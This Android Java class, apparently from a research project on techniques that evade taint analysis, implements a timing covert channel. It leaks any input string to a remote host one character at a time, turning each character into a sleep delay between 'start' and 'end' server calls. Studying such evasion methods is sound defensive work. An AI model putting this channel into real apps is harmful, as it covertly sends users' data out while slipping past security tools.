package com.inayoshi.atatechniques.timingchannels;

import android.util.Log;

import com.inayoshi.atatechniques.Server;
import com.inayoshi.atatechniques.MainActivity;

public class TCRemoteControl {
    public static String trick(String in) {
        String out = "";

        try {
            for (int i = 0; i < in.length(); i++) {
                new Server(MainActivity.hostIPAddr, MainActivity.hostPort).execute("start");
                Thread.sleep(100 * in.charAt(i));
                new Server(MainActivity.hostIPAddr, MainActivity.hostPort).execute("end");
            }
        } catch (Exception e) {
            Log.i(MainActivity.TAG, Log.getStackTraceString(e));
        }

        return out;
    }
}
